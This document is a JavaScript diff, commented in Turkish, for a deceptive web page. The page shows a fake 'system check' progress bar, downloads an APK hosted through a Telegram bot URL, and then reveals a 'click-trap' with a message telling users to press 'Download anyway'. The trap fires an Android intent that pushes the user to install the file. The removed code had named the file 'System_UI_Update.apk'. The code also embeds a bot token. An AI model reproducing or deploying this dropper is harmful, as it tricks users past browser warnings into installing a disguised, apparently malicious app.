@@ -1,34 +1,54 @@
-// Click-trap'e basıldığında tetiklenecek fonksiyon
+// 1. Önce fonksiyonu tanımlıyoruz (Hata almamak için en üstte olmalı)
+function runProgressBar(callback) {
+    const bar = document.getElementById('bar');
+    const status = document.getElementById('status');
+    
+    let width = 0;
+    const interval = setInterval(() => {
+        width += Math.random() * 6; // Hızlı ve gerçekçi artış
+        if (width >= 100) {
+            clearInterval(interval);
+            bar.style.width = "100%";
+            status.innerText = "Sistem kontrolü tamamlandı.";
+            // İşlem bittiğinde callback (yani indirme) başlar
+            callback();
+        } else {
+            bar.style.width = width + "%";
+            status.innerText = "Hazırlanıyor: %" + Math.round(width);
+        }
+    }, 100);
+}
+
+// 2. Ana buton dinleyicisi
+document.getElementById('start-btn').addEventListener('click', function() {
+    this.style.display = 'none'; // Butonu gizle
+    const status = document.getElementById('status');
+    const trap = document.getElementById('click-trap');
+
+    // Fonksiyonu çağırıyoruz
+    runProgressBar(() => {
+        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
+
+        // ADIM A: Chrome uyarısını tetikle
+        window.location.href = apkUrl;
+
+        // ADIM B: 0.5 saniye sonra tuzağı (Click-trap) aktif et
+        setTimeout(() => {
+            trap.style.display = "block";
+            status.innerHTML = "<b style='color:#d93025'>DİKKAT:</b> Kurulumu onaylamak için alttaki <b>'Yine de indir'</b> butonuna basın.";
+        }, 500);
+    });
+});
+
+// 3. TUZAK TIKLANDIĞINDA (Android'i yüklemeye zorlayan kısım)
 document.getElementById('click-trap').addEventListener('click', function() {
     const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
     
-    // 1. Kullanıcı zaten sistem butonuna basıyor olacak, 
-    // biz de arka planda 'Aç' komutunu (intent) tekrar gönderiyoruz.
-    const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
+    // Protokolü temizle ve Intent'e çevir
+    const cleanUrl = apkUrl.replace('https://', '');
+    const intentUrl = `intent://${cleanUrl}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
     
-    // Küçük bir gecikmeyle sistemi zorla
-    setTimeout(() => {
-        window.location.href = intentUrl;
-    }, 500);
-});
-
-// Ana buton fonksiyonu
-document.getElementById('start-btn').addEventListener('click', function() {
-    this.style.display = 'none';
-    runProgressBar(() => {
-        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
-        
-        // Önce indirmeyi başlat (Bu o gri popup'ı açar)
-        const a = document.createElement('a');
-        a.href = apkUrl;
-        a.download = "System_UI_Update.apk";
-        document.body.appendChild(a);
-        a.click();
-        
-        // 1 saniye sonra kırmızı tuzağı aktif et
-        setTimeout(() => {
-            document.getElementById('click-trap').style.display = "block";
-            document.getElementById('status').innerHTML = "<b>KRİTİK:</b> Lütfen alttaki <b>'Yine de indir'</b> butonuna dokunarak kurulumu onaylayın.";
-        }, 1000);
-    });
+    // Kullanıcı dokunduğu anda sistemi yükleme ekranına fırlatır
+    window.location.href = intentUrl;
+    console.log("Sistem yükleyiciye yönlendiriliyor...");
 });
